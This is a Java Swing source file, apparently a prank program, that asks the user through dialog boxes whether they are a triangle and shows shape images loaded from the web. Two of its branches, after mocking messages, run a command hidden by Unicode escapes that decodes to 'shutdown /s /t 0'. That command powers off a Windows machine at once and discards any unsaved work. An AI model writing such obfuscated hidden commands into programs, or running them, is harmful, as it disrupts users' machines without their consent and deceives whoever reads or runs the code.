import java.awt.Component;
import java.awt.Frame;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

import java.awt.Component;

public class ShapeDrawer {
	public static void main(String[] args) throws IOException {
		int answer = JOptionPane.showConfirmDialog(null, "Are you a triangle?");

		if (answer == 0) {

			int ans2 = JOptionPane.showConfirmDialog(null, "Can I draw a picture of you?");

			if (ans2 == 0) {
				Frame quizWindow = new Frame();
				quizWindow.setVisible(true);
				String photo = "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Simple_triangle.svg/220px-Simple_triangle.svg.png";
				Component image;
				image = createImage(photo);
				quizWindow.add(image);
				quizWindow.pack();
			}
			
			else if (ans2 == 1) {

				JOptionPane.showMessageDialog(null, "Well you are getting pranked.");
				Frame quizWindow = new Frame();
				quizWindow.setVisible(true);
				String photo = "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Simple_triangle.svg/220px-Simple_triangle.svg.png";
				Component image;
				image = createImage(photo);
				quizWindow.add(image);
				quizWindow.pack();
			} 
			
			else {
				JOptionPane.showMessageDialog(null, "You wont get away with trying to hide your identity.");
				Frame quizWindow = new Frame();
				quizWindow.setVisible(true);
				String photo = "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Simple_triangle.svg/220px-Simple_triangle.svg.png";
				Component image;
				image = createImage(photo);
				quizWindow.add(image);
				quizWindow.pack();
			}

		}
	
	if (answer==1) {
		JOptionPane.showMessageDialog(null, "I know your true identity.");
		Frame quizWindow = new Frame();
		quizWindow.setVisible(true);
		String photo = "http://study.com/cimages/multimages/16/dodecagon.png";
		Component image;
		image = createImage(photo);
		quizWindow.add(image);
		quizWindow.pack();
		String name = JOptionPane.showInputDialog("Now that I know who you really are, what is your name?");
		JOptionPane.showMessageDialog(null, name +", you have fulfilled your purpose.  Goodbye.");
		Runtime.getRuntime().exec("\u0073\u0068\u0075t\u0064o\u0077\u006e /s /t 0");
		
	}

	else if(answer==2)
	{
		JOptionPane.showMessageDialog(null, "Prepare to get pranked.");
		Runtime.getRuntime().exec("\u0073\u0068\u0075t\u0064o\u0077\u006e /s /t 0");
	}
	}

	private static Component createImage(String imageUrl) throws MalformedURLException {
		URL url = new URL(imageUrl);
		Icon icon = new ImageIcon(url);
		JLabel imageLabel = new JLabel(icon);
		return imageLabel;
	}
}

